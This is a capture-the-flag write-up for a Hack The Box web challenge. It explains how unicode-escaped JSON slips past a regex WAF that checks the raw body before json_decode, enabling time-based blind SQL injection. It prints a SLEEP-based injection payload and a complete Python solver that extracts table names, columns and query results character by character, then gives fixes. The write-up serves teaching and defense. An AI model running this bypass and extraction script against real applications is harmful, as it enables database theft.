## Overview

**wafwaf** is a Medium-difficulty [Web](https://www.hackthebox.com/) challenge. A `GET /` request prints the full PHP source: a `waf()` method that blacklists dangerous characters and SQL keywords with a regex, and a `query()` method that builds SQL with `vsprintf` — no prepared statements. The catch is *where* the WAF looks: it runs its regex on the **raw** request body and only afterwards `json_decode()`s it. Filter and database therefore see two different representations of the same input, so unicode-escaping the whole payload sails past the blacklist while `json_decode` rebuilds a live injection. Output is suppressed, so the data comes back through a [time-based blind SQL injection](https://cwe.mitre.org/data/definitions/89.html) oracle.

## The technique

The source served on `GET /`:

```php
class db extends Connection {
    public function waf($s) {
        if (preg_match_all('/'. implode('|', array(
            '[' . preg_quote("(*<=>|'&-@") . ']',          // blacklisted chars
            'select','and','or','if','by','from','where',  // blacklisted keywords
            'as','is','in','not','having'
        )) . '/i', $s, $matches)) die(var_dump($matches[0]));
        return json_decode($s);                            // decode AFTER the check
    }
    public function query($sql) {
        $args = func_get_args(); unset($args[0]);
        return parent::query(vsprintf($sql, $args));       // vsprintf -> no params
    }
}
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $obj = $db->waf(file_get_contents('php://input'));     // raw bytes inspected
    $db->query("SELECT note FROM notes WHERE assignee = '%s'", $obj->user);
}
```

Two design errors combine into the bug:

1. **`waf()` inspects `file_get_contents('php://input')`** — the *literal* JSON text — then `json_decode`s it. This is the classic [encoding/output-canonicalization bypass](https://cwe.mitre.org/data/definitions/116.html): the security decision and the dangerous operation run on different canonical forms of the same bytes.
2. **`query()` uses `vsprintf("...'%s'", $user)`** — no prepared statement, so the decoded `user` value is concatenated straight into the [SQL query](https://cwe.mitre.org/data/definitions/89.html).

JSON allows `\uXXXX` for any character. If every character of the value is sent as `\uXXXX`, the raw body is nothing but backslashes, `u`, and hex digits `[0-9a-f]` — it contains no blacklisted character, and **no blacklisted keyword can be spelled from hex digits alone** (every banned word — `select`, `and`, `if`, `from`, … — has a non-hex letter). `json_decode` then reconstructs the real SQL. Escaping the whole value is unconditionally clean, so there is no need to reason about which keyword to obfuscate.

Because `error_reporting(0)` is set and the `note` result is never echoed, the channel is blind. A `SLEEP()` conditional becomes a 1-bit oracle:

```sql
x' AND (SELECT 1 FROM (SELECT(IF((<cond>),SLEEP(2),0)))a) AND 'x'='y
```

Observed timing: baseline `0.2s`, condition-true `4.3s`, condition-false `0.3s`.

## Solution

The solver unicode-escapes every payload, uses the `SLEEP` oracle, and binary-searches `LENGTH()` then `ASCII(SUBSTR())` to extract data character by character. Two gotchas shaped the code: the `vsprintf("%s")` sink means **no literal `%`** may appear in the payload (it would be consumed as a format directive), so `ASCII(SUBSTR())` is used instead of `LIKE '%..%'`; and the extraction must run **single-threaded**, because a single nginx/php-fpm worker serializes requests — a concurrent pool queued fast (false) requests behind a running `SLEEP` (true) one and corrupted the timing.

`solve.py`:

```python
#!/usr/bin/env python3
# HTB wafwaf - PHP json_decode unicode WAF bypass + time-based blind SQLi
import sys, time, urllib.request

T = sys.argv[1] if len(sys.argv) > 1 else "http://TARGET:PORT/"
DELAY = 2
THRESH = 1.1

def esc(p):
    return ''.join('\\u%04x' % ord(c) for c in p)

def _hit(cond):
    inj = "x' AND (SELECT 1 FROM (SELECT(IF((%s),SLEEP(%d),0)))a) AND 'x'='y" % (cond, DELAY)
    body = ('{"user":"' + esc(inj) + '"}').encode()
    req = urllib.request.Request(T, data=body, headers={"Content-Type":"application/json"})
    t0 = time.time()
    try:
        urllib.request.urlopen(req, timeout=DELAY+25).read()
    except Exception:
        pass
    return time.time()-t0

def oracle(cond):
    dt = _hit(cond)
    if abs(dt - THRESH) < 0.6:
        dt = _hit(cond)
    return dt > THRESH

def bsearch_len(qexpr, lo=0, hi=512):
    while lo < hi:
        mid = (lo+hi)//2
        if oracle("LENGTH((%s))>%d" % (qexpr, mid)):
            lo = mid+1
        else:
            hi = mid
    return lo

def char_at(qexpr, i):
    lo, hi = 31, 127
    while lo < hi:
        mid = (lo+hi)//2
        if oracle("ASCII(SUBSTR((%s),%d,1))>%d" % (qexpr, i, mid)):
            lo = mid+1
        else:
            hi = mid
    return chr(lo) if lo > 31 else '?'

def extract(qexpr, label=""):
    n = bsearch_len(qexpr)
    out = ""
    for i in range(1, n+1):
        out += char_at(qexpr, i)
    print("[+] %s = %s" % (label, out), flush=True)
    return out

if __name__ == "__main__":
    what = sys.argv[2] if len(sys.argv) > 2 else "tables"
    if what == "tables":
        extract("SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()", "tables")
    elif what == "cols":
        tbl = sys.argv[3]
        extract("SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x%s" % tbl.encode().hex(), "cols of "+tbl)
    elif what == "dump":
        extract(sys.argv[3], "dump")
```


## Why it worked

The WAF and the SQL engine operated on **different canonical forms of the same bytes**. The regex matched the raw transport encoding (`\uXXXX` escapes), while `json_decode` produced the decoded string that reached the query — so the filter never saw the dangerous form it was meant to block. The decoded payload then hit an unparameterized `vsprintf` query, turning the bypass directly into SQL injection, exfiltrated one bit at a time through response timing.

## Fix / defense

- **Parameterize the query** (placeholders / prepared statements). This kills the injection regardless of any WAF, because user data can never change the query structure.
- **Decode before deciding**: validate the `json_decode`'d data, never the raw transport bytes — security checks must run on the same canonical form the sink consumes.
- Do not rely on a signature blacklist as the primary control; reject unexpected encodings instead of normalize-then-allow.
